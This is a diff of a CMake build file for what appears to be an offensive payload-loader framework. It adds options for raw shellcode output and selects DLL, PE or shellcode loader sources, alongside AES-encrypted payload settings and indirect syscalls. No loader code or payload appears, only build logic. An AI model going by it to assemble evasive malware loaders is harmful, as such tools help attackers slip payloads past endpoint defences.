@@ -35,10 +35,14 @@ add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})
 if(${PAYLOAD_INDIRECT_SYSCALLS} STREQUAL "true")
     add_compile_definitions(PAYLOAD_INDIRECT_SYSCALLS=${PAYLOAD_INDIRECT_SYSCALLS})
 endif()
+if(${PAYLOAD_FORMAT} STREQUAL "bin")
+    add_compile_definitions(IS_SHELLCODE=1)
+endif()
 
 # SOURCES
 set(SOURCE_ASM
-        ${ASM_OBJECT}
+    ${ASM_OBJ_SYSCALLS}
+    ${ASM_OBJ_START}
 )
 
 set(SOURCE_CORE
@@ -59,12 +63,24 @@ set(SOURCE_CORE
         src/core/system/process.cpp
         src/core/utils/convert.cpp
 )
-if(${PAYLOAD_TYPE} STREQUAL \"dll\")
-    set(SOURCE_MAIN src/main/dll_loader_${PAYLOAD_FORMAT}.cpp)
-elseif(${PAYLOAD_TYPE} STREQUAL \"exec\")
-    set(SOURCE_MAIN src/main/exec_loader_${PAYLOAD_FORMAT}.cpp)
-elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode\")
-    set(SOURCE_MAIN src/main/shellcode_loader_${PAYLOAD_FORMAT}.cpp)
+if(${PAYLOAD_TYPE} STREQUAL \"dll-loader\")
+    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/dll_loader_exe.cpp src/main/entry.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
+        set(SOURCE_MAIN src/main/dll_loader_dll.cpp src/main/entry.cpp)
+    endif()
+elseif(${PAYLOAD_TYPE} STREQUAL \"pe-loader\")
+    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/pe_loader_exe.cpp src/main/entry.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
+        set(SOURCE_MAIN src/main/pe_loader_dll.cpp src/main/entry.cpp)
+    endif()
+elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode-loader\")
+    if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
+        set(SOURCE_MAIN src/main/shellcode_loader_exe.cpp src/main/entry.cpp)
+    elseif(${PAYLOAD_FORMAT} STREQUAL "dll")
+        set(SOURCE_MAIN src/main/shellcode_loader_dll.cpp src/main/entry.cpp)
+    endif()
 endif()
 
 # LINK LIBRATILIES
@@ -80,7 +96,7 @@ if(${PAYLOAD_FORMAT} STREQUAL "dll")
             SUFFIX ".dll"
     )
     add_definitions(-DIS_DLL)
-elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
+elseif(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "exe")
     add_executable(${PROJECT_NAME} WIN32 ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
     set_target_properties(${PROJECT_NAME}
         PROPERTIES
